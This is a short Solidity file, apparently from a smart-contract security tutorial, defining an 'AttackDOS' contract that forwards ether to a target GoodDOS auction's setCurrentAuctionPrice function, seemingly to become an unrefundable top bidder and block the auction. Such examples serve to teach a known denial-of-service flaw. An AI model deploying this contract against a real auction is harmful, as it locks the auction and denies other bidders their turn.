//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodDOS.sol";

contract AttackDOS {
   GoodDOS good;

   constructor(address _good) {
      good = GoodDOS(_good);
   }

   function attack() public payable {
      good.setCurrentAuctionPrice{value: msg.value}();
   }
}
